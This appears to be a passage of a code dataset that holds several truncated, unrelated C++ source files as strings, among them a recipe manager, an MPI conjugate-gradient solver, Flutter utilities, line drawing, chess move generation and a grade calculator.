0.0f;\n    vp.MaxZ = 1.0f;\n    bd->pd3dDevice->SetViewport(&vp);\n\n    // Setup render state: fixed-pipeline, alpha-blending, no face culling, no depth testing, shade mode (for gradient), bilinear sampling.\n    bd->pd3dDevice->SetPixelShader(nullptr);\n    bd->pd3dDevice->Se",
    "#include <iostream>\n#include <string>\n#include <fstream>\n#include <sstream>\n#include <vector>\n#include <limits> \n\nusing namespace std;\nconst int days = 7;\nconst int meals = 3;\nstring daysOfWeek[days] = {\"Monday\", \"Tuesday\", \"Wednesday\", \"Thursday\", \"Friday\", \"Saturday\", \"Sunday\"};\nstruct Recipe\n{\n    vector<string> recipe;\n    int m = 0;\n};\n\nRecipe add_line_in_vector(const string &line)\n{\n    Recipe recipe;\n    stringstream get(line);\n    string temp;\n    while (getline(get, temp, ','))\n    {\n        if (temp != \"directions\")\n        {\n            recipe.m++; // Count the number of ingredients\n        }\n        else\n        {\n            // Stop parsing ingredients when \"directions\" is encountered\n        }\n        recipe.recipe.push_back(temp);\n    }\n    return recipe;\n}\n\nvoid searchRecipe(const string &file_name, const string &recipe_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n        if (recipe_name == recipe.recipe[0])\n        {\n            flag = 1; // Recipe found\n            cout << \"Recipe Name: \" << recipe.recipe[0] << endl;\n            cout << \"Category: \" << recipe.recipe[1] << endl;\n            cout << \"Ingredients:\" << endl;\n            for (int i = 2; i < recipe.recipe.size(); ++i)\n            {\n                if (recipe.recipe[i] == \"directions\")\n                {\n                    cout << \"Directions :\" << endl;\n                }\n                else if (recipe.recipe[i] == \"Directions :\")\n                {\n                    continue;\n                }\n                else\n                    cout << \"-\"<<recipe.recipe[i] << endl;\n            }\n\n            break; // No need to continue searching after finding the recipe\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"Recipe not found.\" << endl;\n    }\n    file.close();\n}\nvoid display_recipe_category(const string &file_name) {\n    ifstream file(file_name);\n    if (!file.is_open()) {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n\n    string line;\n    while (getline(file, line)) {\n        Recipe recipe = add_line_in_vector(line);\n        cout << \"Recipe: \" << recipe.recipe[0] << \" - Category: \" << recipe.recipe[1] << endl;\n    }\n    \n    file.close();\n}\n\nvoid ingredientsearch(const string &file_name, const string &ingredient_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n        for (int i = 2; i < recipe.m - 2; ++i)\n        {\n            if (ingredient_name == recipe.recipe[i])\n            {\n                flag = 1;\n                cout << recipe.recipe[0] << endl;\n            }\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"No recipe contain these ingredients.\" << endl;\n    }\n    file.close();\n}\n\nvoid recipe_adder(const string &rec_name, const string &rec_type, const string &rec_ings, const string &rec_steps, ofstream &tracker)\n{\n    tracker << rec_name << \",\" << rec_type << \",\" << rec_ings << \",directions,\" << rec_steps << endl;\n    tracker.seekp(-1, ios_base::cur);   //to move to the file pointer to starting of the file\n}\n\nvoid recipe_deleter(const string& filename, const string& recipe_name) {\n    ifstream infile(filename);\n    if (!infile) {\n        cerr << \"Error: Unable to open file \" << filename << endl;  //error  meassage\n        return;\n    }\n    //creating vector to hold strings\n    vector<string> lines;\n    string line;\n    \n    while (getline(infile, line)) {\n    if (line.find(recipe_name) == string::npos) {\n        lines.push_back(line);\n    }\n    else\n    cout << \"Recipe has been deleted.\" << endl;\n    }\n\n    infile.close();\n    ofstream outfile(filename);\n    if (!outfile) {\n        cout << \"Error: Unable to open file \" << filename << \" for writing.\" << endl;\n        return;\n    }\n    //writes the recipes to the file\n    for (const auto& l : lines) {\n        outfile << l << endl;\n    }\n    outfile.close();\n}\n\nvoid categorysearch(const string &file_name, const string &category_name)\n{\n    ifstream file(file_name);\n    if (!file.is_open())\n    {\n        cout << \"ERROR: File is not open!\" << endl;\n        return;\n    }\n    string line;\n    Recipe recipe;\n    int flag = 0;\n    while (getline(file, line))\n    {\n        recipe = add_line_in_vector(line);\n\n        if (category_name == recipe.recipe[1])\n        {\n            flag = 1;\n            cout << recipe.recipe[0] << endl;\n        }\n    }\n    if (flag == 0)\n    {\n        cout << \"No recipe is found of these category.\" << endl;\n    }\n    file.close();\n}\nvoid displayMP()\n{\n    ifstream file(\"Book.csv\");\n    if (!file.is_open())\n    {\n        cout << \"ERROR: Unable to ope",
    "#include <iostream>\n#include <vector>\n#include <opencv2/opencv.hpp>\n\n/**\n * @brief Creates a color map with N entries, mapping M RGB colors to gray tones.\n *\n * @param M The number of RGB colors.\n * @param N The number of entries in the color map.\n * @return A 2D vector representing the color map.\n */\nstd::vector<std::vector<int>> createColorMap(int M, int N)\n{\n  std::vector<std::vector<int>> colorMap(N, std::vector<int>(3));\n  int step = M / N;\n  int grayTone;\n\n  for (int i = 0; i < N; ++i)\n  {\n    grayTone = i * step;\n    colorMap[i][0] = grayTone;\n    colorMap[i][1] = grayTone;\n    colorMap[i][2] = grayTone;\n  }\n\n  return colorMap;\n}\n\n/**\n * @brief Main function.\n */\nint main()\n{\n  int M = 256;\n  int N = 100;\n\n  std::vector<std::vector<int>> colorMap = createColorMap(M, N);\n\n  std::cout << std::endl\n            << \"Color-map result:\" << std::endl\n            << std::endl;\n  for (int i = 0; i < N; ++i)\n  {\n    std::cout << \"Entry \" << i << \": (\" << colorMap[i][0] << \", \" << colorMap[i][1] << \", \" << colorMap[i][2] << \");\" << std::endl;\n  }\n\n  std::cout << std::endl;\n\n  cv::Mat image(100, 100, CV_8UC3);\n  for (int i = 0; i < N; ++i)\n  {\n    for (int j = 0; j < N; ++j)\n    {\n      image.at<cv::Vec3b>(i, j)[0] = colorMap[j][0];\n      image.at<cv::Vec3b>(i, j)[1] = colorMap[j][1];\n      image.at<cv::Vec3b>(i, j)[2] = colorMap[j][2];\n    }\n  }\n\n  cv::imwrite(\"../images/color-map.png\", image);\n  cv::waitKey(0);\n\n  return 0;\n}\n",
    "#include <iostream>\n#include <algorithm>\n#include <cstring>\n#include <iomanip>\n#include <vector>\n#include <mpi.h>\n#include <omp.h>\n#include <cmath>\n#include <cblas.h>\n#include \"SolverCG.h\"\n\nusing namespace std;\n\n\n\n/*!*****************************************************************************\n * @brief  Define the indexing operations for both local and global matrices, in row-major format\n * @note  indexing from (0,0) in bottom left corner.\n *******************************************************************************/\n#define IDX(I,J) ((J)*Nx + (I))\n#define IDX_LOCAL(I,J) ((J)*NxLocal + (I))\n\n/**\n * @brief Constructs the SolverCG class.\n * \n * Initialises local variables, calculates local domain size. \n *\n * @param pNx           Global number of grid points along x.\n * @param pNy           Global number of grid points along y.\n * @param pdx           Grid spacing along x.\n * @param pdy           Grid spacing along y.\n * @param Startx        Starting index in x for the local domain.\n * @param Endx          Ending index in x for the local domain.\n * @param Starty        Starting index in y for the local domain.\n * @param Endy          Ending index in y for the local domain.\n * @param pcomm         MPI communicator.\n * @param north         Rank of the northern neighbor (-2 if none).\n * @param east          Rank of the eastern neighbor (-2 if none).\n * @param south         Rank of the southern neighbor (-2 if none).\n * @param west          Rank of the western neighbor (-2 if none).\n */\nSolverCG::SolverCG(int pNx, int pNy, double pdx, double pdy, int Startx, int Endx, int Starty, int Endy, MPI_Comm pcomm, \n                    int north, int east, int south, int west)\n{\n    dx = pdx;\n    dy = pdy;\n    Nx = pNx;\n    Ny = pNy;\n    NxLocal = Endx - Startx + 1;\n    NyLocal = Endy - Starty + 1;\n    \n    int n_local = NxLocal * NyLocal;\n    \n    r = new double[n_local];\n    p = new double[n_local];\n    z = new double[n_local];\n    t = new double[n_local]; //temp\n    \n    comm = pcomm;\n    MPI_Comm_rank(pcomm, &world_rank);\n    MPI_Comm_size(pcomm, &world_size);\n    \n    North = north;\n    East = east;\n    South = south;\n    West = west;\n    \n}\n\n/**\n *  @brief Destroys the SolverCG object and deallocates dynamic arrays.\n */\nSolverCG::~SolverCG()\n{\n    delete[] r;\n    delete[] p;\n    delete[] z;\n    delete[] t;\n}\n\n/**\n * @brief Exchanges data between ranks.\n *\n * Key function yto exchange the LOCAL borders data across each rank. \n * Each rank only sends data to the neighbours that exist (!= -2).\n * They send the entire row/column, including corners, because in the case where a rank\n * is at a global border, it needs that corner value (which is also \n * at a global boundary) for accuracy.\n * \n * \n * @param   s           pointer to matrix we wish to print.\n * @param   NxLocal     Size of matrix in the x direction\n * @param   NyLocal     Size of matrix in the y direction\n * @param   north       rank of north neighbour\n * @param   south       rank of south neighbour\n * @param   east        rank of east neighbour\n * @param   west        rank of west neighbour\n */\nvoid SolverCG::exchangeBoundaryData(double* s, int NxLocal, int NyLocal, int north, int south, int east, int west) {\n    MPI_Status status;\n\n    // Edge buffers for send/receive operations, accounting for corners when on domain edges\n    double* sendNorth = new double[NxLocal];\n    double* recvNorth = new double[NxLocal];\n    double* sendSouth = new double[NxLocal];\n    double* recvSouth = new double[NxLocal];\n    double* sendEast = new double[NyLocal]; \n    double* recvEast = new double[NyLocal];\n    double* sendWest = new double[NyLocal];\n    double* recvWest = new double[NyLocal];\n\n    // Fill send buffers, including handling corners specifically for ranks on edges\n    for (int i = 0; i < NxLocal; ++i) {\n        sendSouth[i] = s[IDX_LOCAL(i, 1)];              // Send the first real row for south, including corners\n        sendNorth[i] = s[IDX_LOCAL(i, NyLocal - 2)];    // Send the last real row for north, including corners\n    }\n    for (int j = 0; j < NyLocal; ++j) {\n        sendWest[j] = s[IDX_LOCAL(1, j)];               // Send the first real column for west, including corners\n        sendEast[j] = s[IDX_LOCAL(NxLocal - 2, j)];     // Send the last real column for east, including corners\n    }\n\n    // North-South communication\n    if (north != -2) {\n        MPI_Sendrecv(sendNorth, NxLocal, MPI_DOUBLE, north, 0,\n                     recvNorth, NxLocal, MPI_DOUBLE, north, 0, MPI_COMM_WORLD, &status);\n                     \n        // Place received data into north ghost row\n        for (int i = 0; i < NxLocal; ++i) {\n            s[IDX_LOCAL(i, NyLocal - 1)] = recvNorth[i];\n        }\n    }\n    if (south != -2) {\n        MPI_Sendrecv(sendSouth, NxLocal, MPI_DOUBLE, south, 0,\n                     recvSouth, NxLocal, MPI_DOUBLE, south, 0, MPI_COMM_WORLD, &status);\n                     \n        // Place received data into south ghost row\n        for (int i = 0; i <",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"line_algorithm.hpp\"\r\n\r\n#include <stdint.h>\r\n#include <vector>\r\n#include <algorithm>\r\n#include <cmath>\r\n\r\nstd::vector<SB_LINE::Coordinate> bresenham_shallow_32(uint32_t x0, uint32_t x1, uint32_t y0, uint32_t y1) {\r\n    std::vector<SB_LINE::Coordinate> values;\r\n\r\n    int32_t dx = x1 - x0;\r\n    int32_t dy = y1 - y0;\r\n    int32_t yi = 1;\r\n\r\n    if (dy < 0) {\r\n        yi = -1;\r\n        dy = -dy;\r\n    }\r\n    int32_t D = (dy << 1) - dx;\r\n    uint32_t y = y0;\r\n\r\n    for (uint32_t i = x0; i <= x1; i++) {\r\n        values.push_back(SB_LINE::Coordinate{ i, y });\r\n\r\n        if (D > 0) {\r\n            y = y + yi;\r\n            D = D + ((dy - dx) << 1);\r\n        }\r\n        else {\r\n            D = D + (dy << 1);\r\n        }\r\n    }\r\n\r\n    return values;\r\n}\r\n\r\nstd::vector<SB_LINE::Coordinate> bresenham_steep_32(uint32_t x0, uint32_t x1, uint32_t y0, uint32_t y1) {\r\n    std::vector<SB_LINE::Coordinate> values;\r\n\r\n    int32_t dx = x1 - x0;\r\n    int32_t dy = y1 - y0;\r\n    int32_t xi = 1;\r\n\r\n    if (dx < 0) {\r\n        xi = -1;\r\n        dx = -dx;\r\n    }\r\n    int32_t D = (dx << 1) - dy;\r\n    uint32_t x = x0;\r\n\r\n    for (uint32_t i = y0; i <= y1; i++) {\r\n        values.push_back(SB_LINE::Coordinate{ x, i });\r\n\r\n        if (D > 0) {\r\n            x = x + xi;\r\n            D = D + ((dx - dy) << 1);\r\n        }\r\n        else {\r\n            D = D + (dx << 1);\r\n        }\r\n    }\r\n\r\n    return values;\r\n}\r\n\r\nstd::vector<SB_LINE::Coordinate> SB_LINE::draw_line32b(uint32_t x0, uint32_t x1, uint32_t y0, uint32_t y1) {\r\n    std::vector<SB_LINE::Coordinate> line;\r\n\r\n    if (x0 - x1 != 0 && y0 - y1 != 0)\r\n        goto diagonal;\r\n\r\n    if (x0 - x1 == 0 && y0 - y1 == 0) {\r\n        line.push_back(Coordinate{ x0, y0 });\r\n        return line;\r\n    }\r\n\r\n    if (x0 - x1 == 0) {\r\n        if (y0 > y1) {\r\n            for (int i = 0; i <= y0 - y1; i++) {\r\n                line.push_back(Coordinate{ x0, y0 - i });\r\n            }\r\n        }\r\n        else {\r\n            for (int i = 0; i <= y1 - y0; i++) {\r\n                line.push_back(Coordinate{ x0, y0 + i });\r\n            }\r\n        }\r\n    }\r\n    else {\r\n        if (x0 > x1) {\r\n            for (int i = 0; i <= x0 - x1; i++) {\r\n                line.push_back(Coordinate{ x0 - i, y0 });\r\n            }\r\n        }\r\n        else {\r\n            for (int i = 0; i <= x1 - x0; i++) {\r\n                line.push_back(Coordinate{ x0 + i, y0 });\r\n            }\r\n        }\r\n    }\r\n    return line;\r\n\r\ndiagonal:\r\n    if (std::abs(static_cast<int32_t>(y1 - y0)) < std::abs(static_cast<int32_t>(x1 - x0))) {\r\n        if (x0 > x1) {\r\n            line = bresenham_shallow_32(x1, x0, y1, y0);\r\n            std::reverse(line.begin(), line.end());\r\n        }\r\n        else {\r\n            line = bresenham_shallow_32(x0, x1, y0, y1);\r\n        }\r\n    }\r\n    else {\r\n        if (y0 > y1) {\r\n            line = bresenham_steep_32(x1, x0, y1, y0);\r\n            std::reverse(line.begin(), line.end());\r\n        }\r\n        else {\r\n            line = bresenham_steep_32(x0, x1, y0, y1);\r\n        }\r\n    }\r\n\r\n    return line;\r\n}",
    "//gen.cpp by Dan Honeycutt.  This software is public domain.\r\n//You may use this software as you wish.  There is no warranty.\r\n#include \"chess.h\"\r\n\r\n/*********************************************************************\r\nFile contains the move generation functions GenCap(), GenMov() \r\nand GenEvade() along with associated support functions.\r\n\r\nTwo move formats are used - a \"short\" (2 byte) move which has\r\ninformation necessary to look up the move in a list and a \"long\" (4 \r\nbyte) move which has information necessary to reverse the move.\r\nbits (and shift values to extract parts) are:\r\n  bits                  shift     note                extract macro\r\n  --------------------  --------  -----               -------------\r\n  6 bits - from         (>>0)     short & long move   mv_b1(mv)\r\n  6 bits - to           (>>6)                         mv_b2(mv)\r\n  3 bits - promotion    (>>12)                        mv_pro(mv)\r\n  1 bit - not used\r\n  4 bits - capture      (>>16)    long move only      mv_cap(mv)\r\n  4 bits - piece moving (>>20)                        mv_man(mv)\r\n  3 bits - spl move     (>>24)                        mv_spl(mv)\r\n    1 (0x1000000 unshifted) = castle king side\r\n    2 (0x2000000 unshifted) = castle queen side\r\n    3 (0x3000000 unshifted) = PxP ep\r\n    4 (0x4000000 unshifted) = Pawn promotion\r\n    5 (0x5000000 unshifted) = Pawn 2 square advance\r\n  1 bit - not used\r\n  =====\r\n  28 bits total = move saved in hash table.\r\n*********************************************************************/\r\n\r\n//squares that must be clear to castle\r\nstatic const U64 mask_wck = 0x0000000000000060;\r\nstatic const U64 mask_wcq = 0x000000000000000e;\r\nstatic const U64 mask_bck = 0x6000000000000000;\r\nstatic const U64 mask_bcq = 0x0e00000000000000;\r\n//promotion bits\r\nstatic const int queen_pro = 1;\r\nstatic const int under_pro = 2;\r\n\r\n//====================================================================\r\n//SetPins() sets pins and pin_mask[] which tells us who is pinned and\r\n//where they can go.  If a pin is found we set pin_mask[] to the \r\n//corresponding rank, file or diagonal from the king to and including\r\n//the pinnor.\r\n//====================================================================\r\nstatic U64 SetPins() {\r\n  int b1, b2, king;\r\n  U64 enemy, a1, d1;      //pinor and pinee\r\n  if (key_1 == pin_key1) {\r\n    return pin_save;\r\n  }\r\n  pin_key1 = key_1;\r\n  pin_save = 0;\r\n  if (color) {        //set black pins\r\n    king = bk_sq;\r\n    enemy = w_men;\r\n    d1 = b_men & atk_queen(king);\r\n  } else {            //set white pins\r\n    king = wk_sq;\r\n    enemy = b_men;\r\n    d1 = w_men & atk_queen(king);\r\n  }\r\n  while (d1) {\r\n    b1 = FirstBit(d1);\r\n    d1 &= sq_clr[b1];\r\n    switch (abs_val(directions[king][b1])) {\r\n    case 1:\r\n      a1 = atk_rank(b1) & rook_queen & enemy;\r\n      break;\r\n    case 7:\r\n      a1 = atk_rl45(b1) & bish_queen & enemy;\r\n      break;\r\n    case 8:\r\n      a1 = atk_file(b1) & rook_queen & enemy;\r\n      break;\r\n    case 9:\r\n      a1 = atk_rr45(b1) & bish_queen & enemy;\r\n      break;\r\n    }\r\n    if (a1) {\r\n      pin_save |= sq_set[b1];\r\n      b2 = FirstBit(a1);\r\n      pin_mask[b1] = a1 | obstructed[king][b2];\r\n    }\r\n  }\r\n  return pin_save;\r\n}\r\n\r\n//====================================================================\r\n//AddEPCap() generates en passant captures.\r\n//target must be the en passant target square\r\n//====================================================================\r\nstatic s_move *AddEPCap(s_move *pm, int target, U64 pins) {\r\n  U64 a1, men, enemy=0;\r\n  int b1, b3, king, temp;\r\n\r\n  if (color) {      //black ep cap\r\n    men = b_pawn & ap_wpawn[target];\r\n    b3 = target+8;\r\n    king = bk_sq;\r\n    if (row(b3) == row(king)) enemy = (w_rook | w_queen) & mask_row[row(king)];\r\n    temp = (target<<6)|(BP<<20)|(WP<<16)|0x3000000;\r\n  } else {        //white ep cap\r\n    men = w_pawn & ap_bpawn[target];\r\n    b3 = target-8;\r\n    king = wk_sq;\r\n    if (row(b3) == row(king)) enemy = (b_rook | b_queen) & mask_row[row(king)];\r\n    temp = (target<<6)|(WP<<20)|(BP<<16)|0x3000000;\r\n  }\r\n  while (men) {\r\n    b1 = FirstBit(men);\r\n    men &= sq_clr[b1];\r\n    a1 = sq_set[target];\r\n    if (pins & sq_set[b1]) a1 &= pin_mask[b1];\r\n    //make sure captured pawn is not sheltering an attack\r\n    if (enemy && a1) {\r\n      //king on pawn rank w/hostile rooks/queens\r\n      if ((!(obstructed[b1][king] & occupied) && (atk_rank(b3) & enemy)) ||\r\n          (!(obstructed[b3][king] & occupied) && (atk_rank(b1) & enemy))) {\r\n        a1 = 0;\r\n      }\r\n    }\r\n    if (a1) (pm++)->move = b1|temp;\r\n  }\r\n  return pm;\r\n}\r\n\r\n//====================================================================\r\n//AddPawnPro() Generates pawn promotions.  Target can be all squares\r\n//====================================================================\r\nstatic s_move *AddPawnPro(s_move *pm, U64 target, U64 pins, int pro) {\r\n  U64 men, moves[3];\r\n  int i, delta, b1, b2, temp;\r\n\r\n  if (color) { //black pawn promotions\r\n    men = b_pawn & rank_2;\r\n    if (!men) return p",
    "\n// ecs36b_JSON.cpp\n// #define _ECS36B_DEBUG_\n\n#include \"ecs36b_Common.h\"\n#include \"JvTime.h\"\n\nvoid\nmyPrintLog\n(std::string content, std::string fname)\n{\n  if (fname.size() == 0) return;\n  \n  FILE *log_f = fopen(fname.c_str(), \"a\");\n  if (log_f == NULL) return;\n  \n  JvTime *jv_ptr = getNowJvTime();\n  std::string *str_ptr = jv_ptr->getTimeString();\n  fprintf(log_f, \"[%s] %s\\n\", str_ptr->c_str(), content.c_str());\n  delete str_ptr;\n  delete jv_ptr;\n  fflush(log_f);\n  fclose(log_f);\n  return;\n}\n\nint\nmyParseJSON\n(std::string input, Json::Value * jv_ptr)\n{\n  if (jv_ptr == NULL) return -1;\n\n  Json::CharReaderBuilder builder;\n  Json::CharReader* reader;\n  std::string errors;\n  bool parsingSuccessful;\n\n  reader = builder.newCharReader();\n  parsingSuccessful = reader->parse(input.c_str(),\n\t\t\t\t    input.c_str() + input.size(),\n\t\t\t\t    jv_ptr, &errors);\n  delete reader;\n\n  if (!parsingSuccessful) {\n    std::cout << \"Failed to parse the content of the first JSON, errors:\" << std::endl;\n    std::cout << errors << std::endl;\n    return -2;\n  }\n  return 0;\n}\n\nchar *\nmyFile2String\n(char *f_name)\n{\n  if (f_name == NULL) return NULL;\n  FILE * f_ptr = fopen(f_name, \"r\");\n  if (f_ptr == NULL) return NULL;\n\n  long lSize;\n  size_t lresult;\n\n  fseek(f_ptr, 0 , SEEK_END);\n  lSize = ftell(f_ptr);\n  rewind(f_ptr);\n\n  // allocate memory to contain the whole file:\n  char *result_ptr = (char *) malloc(sizeof(char)*lSize);\n  // copy the file into the buffer:\n  lresult = fread(result_ptr, 1, lSize, f_ptr);\n  fclose(f_ptr);\n\n  if (lresult != lSize)\n    {\n      fputs(\"Reading error\", stderr);\n      free(result_ptr);\n      return NULL;\n    }\n\n  return result_ptr;\n}\n\nint\nmyFile2JSON\n(char *f_name, Json::Value * jv_ptr)\n{\n  int rc;\n\n  char *json_str = myFile2String(f_name);\n  std::cout << f_name << std::endl;\n\n  // std::cout << ((void *) json_str) << std::endl;\n  // std::cout << jv_ptr << std::endl;\n\n  if (json_str == NULL) rc = -1;\n  else\n    {\n      rc = myParseJSON(json_str, jv_ptr);\n      free(json_str);\n    }\n  return rc;\n}\n\nint\nmyJSON2File\n(char *f_name, Json::Value * jv_ptr)\n{\n  if (f_name == NULL) return -1;\n  if (jv_ptr == NULL) return -2;\n\n  FILE * f_ptr = fopen(f_name, \"w\");\n  if (f_ptr == NULL)\n    {\n      std::cout << f_name << \" fopen for write failed myJSON2File\" << std::endl;\n      return -3;\n    }\n\n  std::string json_str = (*jv_ptr).toStyledString();\n  int msize = json_str.size() + 1;\n  char *json_buf_ptr = (char *) malloc(msize);\n  bzero(json_buf_ptr, msize);\n  snprintf(json_buf_ptr, msize, \"%s\", json_str.c_str());\n\n  long lSize;\n  size_t lresult;\n\n  lSize = strlen(json_buf_ptr);\n  std::cout << f_name << \" \" << lSize <<  std::endl;\n  lresult = fwrite(json_buf_ptr, 1, lSize, f_ptr);\n  free(json_buf_ptr);\n  fclose(f_ptr);\n\n  if (lresult != lSize)\n    {\n      fputs(\"Writing error\", stderr);\n      return -4;\n    }\n\n  return 0;\n}\n\nconst char *ecs36berror[] =\n  {\n    \"Normal\",\n    \"Incorrect vsID in history\",\n    \"Incorrect vsID in Post ID\",\n    \"JSON_Post_Merging failed\",\n    \"lresult lSize mismatch\",\n    \"JSON Parsing Error\",\n    \"JSON_2_Post failed\",\n    \"JSON Post No ID\",\n    \"JSON Value pointer NULL\",\n    \"File not Exist\",\n    \"File Read Error\",\n    \"File Name Pointer Null\",\n    \"File Write Error\",\n    \"Less Than 5 History Records\",\n    \"No Search Keyword Found\",\n    \"No OKey Found\",\n    \"No OKey Found and very Strange\",\n    \"Time Interval too Short for this Post\",\n    \"Search Keyword Format Incorrect\",\n    \"std set struct tm Error\",\n    \"Null C++ Object Pointer\",\n    \"Post ID Mismatched\",\n    \"Please experiment this JSON with Server 2, port 55408 instead\",\n    \"JSON2Object class Action\",\n    \"JSON2Object class Comment\",\n    \"JSON2Object class Commutable\",\n    \"JSON2Object class Core\",\n    \"JSON2Object class GPS_DD\",\n    \"JSON2Object class Holdable\",\n    \"JSON2Object class JvTime\",\n    \"JSON2Object class Labeled_GPS\",\n    \"JSON2Object class Link\",\n    \"JSON2Object class Locatable\",\n    \"JSON2Object class Message\",\n    \"JSON2Object class OKey\",\n    \"JSON2Object class Person\",\n    \"JSON2Object class Post\",\n    \"JSON2Object class Reaction\",\n    \"JSON2Object class Record\",\n    \"JSON2Object class Tag\",\n    \"JSON2Object class Team\",\n    \"JSON2Object class Thing\",\n    \"JSON Value Key missing\",\n    \"JSON Value Key Value Type mismatched\",\n    \"JvTime String format\",\n    \"Post ID Check Failed\",\n    \"JSONRPC Server\",\n    \"JSONRPC Client\",\n    \"Strlen >= 1023\",\n    \"ID being set Twice\",\n    \"Invalid Error Code (ECS36B_ERROR_MAX)\",\n  };\n\nconst char *\nerror_string\n(int code)\n{\n  if ((code > 0) || (code <= ECS36B_ERROR_MAX))\n    {\n      return ecs36berror[(-1) * ECS36B_ERROR_MAX];\n    }\n  else\n    {\n      return ecs36berror[(-1) * code];\n    }\n}\n\nint\nproduceErrorJSON\n(ecs36b_Exception e, const char log_file_name[], Json::Value *jv_ptr, int extra)\n{\n  if (((e.info_vector).size() <= 0) ||\n      (jv_ptr == NULL) ||\n      (log_file_name == NULL))\n    return ECS36B_ERROR_NULL_JSON_PTR;\n\n  jv_ptr = e.dump2JSON();\n  myPrintLog((*jv_ptr).toStyledSt",
    "#include \"john.h\"\n#include \"amaka.h\"\n#include \"peter.h\"\n#include \"miracle.h\"\n#include <iostream>\n#include <limits>\n#include <iomanip>\n#include <cctype>\n\ntemplate <typename T>\n  T getInput(const std::string& prompt){\n      T value;\n      std::cout<<prompt;\n      while(!(std::cin>>value)){\n          std::cin.clear();\n          std::cin.ignore(std::numeric_limits<std::streamsize>::max(),'\\n');\n          std::cerr<<\"Invalid input. Try again.\"<<std::endl;\n          std::cout<<prompt;\n      }\n      return value;\n  }\n  \n  int main(){\n\t \n     char gr[6] = {'A', 'B', 'C', 'D', 'E', 'F'};\n     //Scores grades of each course.\n     char ee1, ee2, ee3, ee4;\n     //Cumulative Points of each course.\n     double cpj1, cpj2, cpj3, cpj4;\n     \n     double A = 15, B = 12, C = 9, D = 6, E = 3, F = 0;\n     \n\tunsigned int EEE401, EEE402, EEE403, EEE404;\n\t \n\t std::string option = getInput<std::string>(\"Enter the student's matric number(DE.2021/2946 - DE.2021/2949): \");\n\t \n\t for(int x = 0; x < option.size(); x++){\n\t     option[x] = std::toupper(option[x]);\n\t }\n\t \n\t while(true){\n\t     if(option == \"DE.2021/2946\"){\n\t \n\t //J. JOHN.\n\t std::cout<<\"\\nSTUDENT: \"<<std::endl;\n\t EEE401 = getInput<unsigned int>(\"Enter the EEE401 score: \");\t\n\t EEE402 = getInput<unsigned int>(\"Enter the EEE402 score: \");\t \n\t EEE403 = getInput<unsigned int>(\"Enter the EEE403 score: \");\t \n\t EEE404 = getInput<unsigned int>(\"Enter the EEE404 score: \");\n\t //EEE401.\n\t if(EEE401 >= 70 && EEE401 <= 100){\n\t     ee1 = gr[0];\n\t     cpj1 = A;\n\t }\n\t else if(EEE401 >= 60 && EEE401 <= 69){\n\t     ee1 = gr[1];\n\t     cpj1 = B;\n\t }\n\t else if(EEE401 >= 50 && EEE401 <= 59){\n\t     ee1 = gr[2];\n\t     cpj1 = C;\n\t }\n\t else if(EEE401 >= 45 && EEE401 <= 49){\n\t     ee1 = gr[3];\n\t     cpj1 = D;\n\t }\n\t else if(EEE401 >= 40 && EEE401 <= 44){\n\t     ee1 = gr[4];\n\t     cpj1 = E;\n\t }\n\t else if(EEE401 >= 0 && EEE401 <= 39){\n\t     ee1 = gr[5];\n\t     cpj1 = F;\n\t }\t\n\t else{\n\t     std::cout<<\"Invalid option.\"<<std::endl;\n\t     ee1 = gr[5];\n\t     cpj1 = F;\n\t     } \n\t //EEE402.\n\t if(EEE402 >= 70 && EEE402 <= 100){\n\t     ee2 = gr[0];\n\t     cpj2 = A;\n\t }\n\t else if(EEE402 >= 60 && EEE402 <= 69){\n\t     ee2 = gr[1];\n\t     cpj2 = B;\n\t }\n\t else if(EEE402 >= 50 && EEE402 <= 59){\n\t     ee2 = gr[2];\n\t     cpj2 = C;\n\t }\n\t else if(EEE402 >= 45 && EEE402 <= 49){\n\t     ee2 = gr[3];\n\t     cpj2 = D;\n\t }\n\t else if(EEE402 >= 40 && EEE402 <= 44){\n\t     ee2 = gr[4];\n\t     cpj2 = E;\n\t }\n\t else if(EEE402 >= 0 && EEE402 <= 39){\n\t     ee2 = gr[5];\n\t     cpj2 = F;\n\t }\n\t else{\n\t     